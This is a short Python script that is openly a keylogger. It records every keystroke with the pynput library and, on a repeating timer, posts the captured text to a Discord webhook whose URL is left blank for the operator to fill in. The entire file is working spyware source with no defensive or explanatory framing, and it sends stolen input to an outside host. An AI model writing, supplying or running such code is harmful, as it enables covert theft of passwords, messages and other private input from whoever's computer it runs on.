from pynput.keyboard import Listener
from threading import Timer
from dhooks import Webhook

DISCORD_WEBHOOK= ""  # Discord webhook url
TIME = 1  # In seconds, change the interval time of sending capured keys to discord server

class Keylogger:
    def __init__(self, webhook_url, time_interval=60):
        self.time_interval = time_interval
        self.webhook = Webhook(webhook_url)
        self.log = ""

    def _send_keys_captured(self):
        if self.log != '':
            self.webhook.send(self.log)
            self.log = ''
        Timer(self.time_interval, self._send_keys_captured).start()


    def _capture(self, key):
        self.log += str(key)


    def execute(self):
        self._send_keys_captured()
        with Listener(self._capture) as p:
            p.join()

if __name__ == '__main__':
    Keylogger(DISCORD_WEBHOOK, TIME).execute()
